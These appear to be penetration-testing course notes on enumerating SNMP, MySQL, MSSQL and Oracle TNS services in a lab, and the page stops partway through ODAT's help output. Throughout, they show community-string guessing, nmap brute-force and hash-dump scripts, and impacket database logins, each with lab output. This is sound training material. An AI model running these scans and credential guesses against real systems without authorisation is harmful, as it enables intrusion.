&lt;h4 id=&quot;onesixtyone&quot;&gt;OneSixtyOne&lt;/h4&gt;

&lt;p&gt;SNMP&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;onesixtyone
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;onesixtyone &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

Scanning 1 hosts, 3220 communities
10.129.14.128 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;public] Linux htb 5.11.0-37-generic &lt;span class=&quot;c&quot;&gt;#41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool &lt;a href=&quot;https://secf00tprint.github.io/blog/passwords/crunch/advanced/en&quot;&gt;crunch&lt;/a&gt; to create custom wordlists. Creating custom wordlists is not an essential part of this module, but more details can be found in the module &lt;a href=&quot;https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat&quot;&gt;Cracking Passwords With Hashcat&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Once we know a community string, we can use it with &lt;a href=&quot;https://github.com/mteg/braa&quot;&gt;braa&lt;/a&gt; to brute-force the individual OIDs and enumerate the information behind them.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;braa
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;braa &amp;lt;community string&amp;gt;@&amp;lt;IP&amp;gt;:.1.3.6.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;# Syntax&lt;/span&gt;
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;braa public@10.129.14.128:.1.3.6.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic &lt;span class=&quot;c&quot;&gt;#36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64&lt;/span&gt;
10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US
10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78
...SNIP...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once again, we would like to point out that the independent configuration of the SNMP service will bring us a great variety of different experiences that no tutorial can replace. Therefore, we highly recommend setting up a VM with SNMP, experimenting with it, and trying different configurations. SNMP can be a boon for an I.T. systems administrator as well as a curse for Security analysts and managers alike.&lt;/p&gt;

&lt;h1 id=&quot;mysql&quot;&gt;MySQL&lt;/h1&gt;

&lt;p&gt;#mysql #mariadb&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MySQL&lt;/code&gt; is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the &lt;a href=&quot;https://www.w3schools.com/sql/sql_intro.asp&quot;&gt;SQL database language&lt;/a&gt;. MySQL works according to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client-server principle&lt;/code&gt; and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.sql&lt;/code&gt;, for example, like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress.sql&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;scanning-mysql-server&quot;&gt;Scanning MySQL Server&lt;/h4&gt;

&lt;p&gt;MySQL&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap 10.129.14.128 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p3306&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; mysql&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-21 00:53 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.14.128
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00021s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute: 
|   Accounts: 
|     root:&amp;lt;empty&amp;gt; - Valid credentials
|_  Statistics: Performed 45010 guesses &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5 seconds, average tps: 9002.0
|_mysql-databases: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_mysql-dump-hashes: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| mysql-empty-password: 
|_  root account has empty password
| mysql-enum: 
|   Valid usernames: 
|     root:&amp;lt;empty&amp;gt; - Valid credentials
|     netadmin:&amp;lt;empty&amp;gt; - Valid credentials
|     guest:&amp;lt;empty&amp;gt; - Valid credentials
|     user:&amp;lt;empty&amp;gt; - Valid credentials
|     web:&amp;lt;empty&amp;gt; - Valid credentials
|     sysadmin:&amp;lt;empty&amp;gt; - Valid credentials
|     administrator:&amp;lt;empty&amp;gt; - Valid credentials
|     webadmin:&amp;lt;empty&amp;gt; - Valid credentials
|     admin:&amp;lt;empty&amp;gt; - Valid credentials
|     &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;:&amp;lt;empty&amp;gt; - Valid credentials
|_  Statistics: Performed 10 guesses &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YTSgMfqvx&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0F&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;7F&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;16&lt;span class=&quot;se&quot;&gt;\&amp;amp;\x&lt;/span&gt;1EAeK&amp;gt;0
|_  Auth Plugin Name: caching_sha2_password
|_mysql-users: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_mysql-variables: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
MAC Address: 00:00:00:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;11.21 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, but a fixed password. We can test this with the following command:&lt;/p&gt;

&lt;p&gt;MySQL&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.129.14.132

ERROR 1045 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Access denied &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;&apos;root&apos;&lt;/span&gt;@&lt;span class=&quot;s1&quot;&gt;&apos;10.129.14.1&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using password: NO&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql -u &amp;lt;user&amp;gt; -p&amp;lt;password&amp;gt; -h &amp;lt;IP address&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Connect to the MySQL server. There should &lt;strong&gt;not&lt;/strong&gt; be a space between the ‘-p’ flag, and the password.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show databases;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Show all databases.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use &amp;lt;database&amp;gt;;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Select one of the existing databases.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show tables;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Show all available tables in the selected database.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show columns from &amp;lt;table&amp;gt;;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Show all columns in the selected database.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select * from &amp;lt;table&amp;gt;;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Show everything in the desired table.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select * from &amp;lt;table&amp;gt; where &amp;lt;column&amp;gt; = &quot;&amp;lt;string&amp;gt;&quot;;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Search for needed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt; in the desired table.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;mssql&quot;&gt;MSSQL&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/en-us/sql-server/sql-server-2019&quot;&gt;Microsoft SQL&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSSQL&lt;/code&gt;) is Microsoft’s SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft’s .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.&lt;/p&gt;

&lt;h4 id=&quot;mssql-clients&quot;&gt;MSSQL Clients&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15&quot;&gt;SQL Server Management Studio&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSMS&lt;/code&gt;) comes as a feature that can be installed with the MSSQL install package or can be downloaded &amp;amp; installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn’t only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. The image below shows SSMS in action.&lt;/p&gt;

&lt;p&gt;MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Default System Database&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Tracks all system information for an SQL server instance&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;model&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msdb&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The SQL Server Agent uses this database to schedule jobs &amp;amp; alerts&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tempdb&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Stores temporary objects&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resource&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Read-only database containing system objects included with SQL server&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Authentication being set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows Authentication&lt;/code&gt; means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.&lt;/p&gt;

&lt;p&gt;This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;MSSQL clients not using encryption to connect to the MSSQL server&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The use of &lt;a href=&quot;https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15&quot;&gt;named pipes&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Weak &amp;amp; default &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sa&lt;/code&gt; credentials. Admins may forget to disable this account&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;nmap-mssql-script-scan&quot;&gt;NMAP MSSQL Script Scan&lt;/h4&gt;

&lt;p&gt;MSSQL&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; mssql.instance-port&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1433,mssql.username&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sa,mssql.password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;,mssql.instance-name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MSSQLSERVER &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1433 10.129.201.248

Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-08 09:40 EST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.201.248
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; RTM
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763

Host script results:
| ms-sql-dac: 
|_  Instance: MSSQLSERVER&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; DAC port: 1434 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;connection failed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;SSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
|     TCP port: 1433
|     Named pipe: &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.129.201.248&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;ipe&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ql&lt;span class=&quot;se&quot;&gt;\q&lt;/span&gt;uery
|_    Clustered: &lt;span class=&quot;nb&quot;&gt;false

&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;8.52 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;connecting-with-mssqlclientpy&quot;&gt;Connecting with Mssqlclient.py&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;impacket-mssqlclient backdoor@10.129.184.227 &lt;span class=&quot;nt&quot;&gt;-windows-auth&lt;/span&gt;

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Encryption required, switching to TLS
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DATABASE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: master, New Value: master
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LANGUAGE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: , New Value: us_english
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PACKETSIZE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: 4096, New Value: 16192
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SQL-01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 1: Changed database context to &lt;span class=&quot;s1&quot;&gt;&apos;master&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SQL-01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 1: Changed language setting to us_english.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ACK: Result: 1 - Microsoft SQL Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;150 7208&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands

SQL&amp;gt; &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;name from sys.databases

name                                                                                                                               

&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------------&lt;/span&gt;

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;oracle-tns&quot;&gt;Oracle TNS&lt;/h1&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Oracle Transparent Network Substrate&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TNS&lt;/code&gt;) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the &lt;a href=&quot;https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html&quot;&gt;Oracle Net Services&lt;/a&gt; software suite, TNS supports various networking protocols between Oracle databases and client applications, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPX/SPX&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP/IP&lt;/code&gt; protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.&lt;/p&gt;

&lt;p&gt;The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP/1521&lt;/code&gt; port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP/IP&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPX/SPX&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AppleTalk&lt;/code&gt;. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Oracle 8i&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;9i&lt;/code&gt; but not in Oracle 10g/11g.&lt;/p&gt;

&lt;h4 id=&quot;testing-odat&quot;&gt;Testing ODAT&lt;/h4&gt;

&lt;p&gt;Oracle TNS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./odat.py &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;

usage: odat.py &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
